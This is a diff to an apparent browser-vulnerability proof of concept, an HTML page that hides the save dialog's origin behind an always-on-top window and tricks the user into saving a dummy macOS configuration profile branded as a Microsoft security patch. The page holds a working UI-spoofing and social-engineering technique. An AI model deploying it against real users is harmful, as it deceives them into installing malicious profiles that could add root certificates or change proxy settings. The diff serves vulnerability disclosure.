@@ -1,8 +1,3 @@
-
-poc_save_file_hijack.html
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -84,27 +79,44 @@ poc_save_file_hijack.html
         // The Mini Window (always-on-top) will cover the native dialog's origin info
         setTimeout(async () => {
             try {
-                // We suggest a malicious-looking filename in DMG format
+                // We suggest a malicious configuration profile
                 const handle = await window.showSaveFilePicker({
-                    suggestedName: 'fix_browser_security.dmg',
+                    suggestedName: 'fix_browser_security.mobileconfig',
                     types: [{
-                        description: 'macOS Disk Image',
-                        accept: {'application/x-apple-diskimage': ['.dmg']}
+                        description: 'macOS Configuration Profile',
+                        accept: {'application/x-apple-aspen-config': ['.mobileconfig']}
                     }],
                 });
-                // If user selects and clicks save, we write dummy DMG content
+                // If user selects and clicks save, we write a dummy mobileconfig XML payload
                 const writable = await handle.createWritable();
-                await writable.write("DUMMY DMG PAYLOAD CONTENT");
+                await writable.write(`<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>PayloadContent</key>
+	<array/>
+	<key>PayloadDisplayName</key>
+	<string>Security Patch Profile</string>
+	<key>PayloadIdentifier</key>
+	<string>com.microsoft.support.securitypatch</string>
+	<key>PayloadType</key>
+	<string>Configuration</string>
+	<key>PayloadUUID</key>
+	<string>12345678-ABCD-EFGH-IJKL-9876543210AB</string>
+	<key>PayloadVersion</key>
+	<integer>1</integer>
+</dict>
+</plist>`);
                 await writable.close();
                 log.style.display = 'block';
                 log.innerHTML = `
                     <b>⚠️ SAVE DIALOG HIJACKED</b><br><br>
-                    File saved successfully: <b>fix_browser_security.dmg</b><br>
-                    <b>Impact:</b> The user was tricked into saving a malicious MacOS Disk Image (.dmg). 
-                    The Mini Window covered the "Origin" information in the native Save dialog, 
-                    making it look like a trusted system action from Microsoft Support.
+                    File saved successfully: <b>fix_browser_security.mobileconfig</b><br>
+                    <b>Impact:</b> The user was tricked into saving a macOS Configuration Profile (.mobileconfig). 
+                    While less immediately terrifying than a .dmg or .sh, this file can silently install malicious root certificates, 
+                    change proxy settings, or enforce bad system policies if the user opens it.
                 `;
-                console.log("[PoC] SUCCESS: Malicious file saved.");
+                console.log("[PoC] SUCCESS: Malicious configuration saved.");
             } catch (err) {
                 console.log("[PoC] Save cancelled or failed:", err.message);
             }
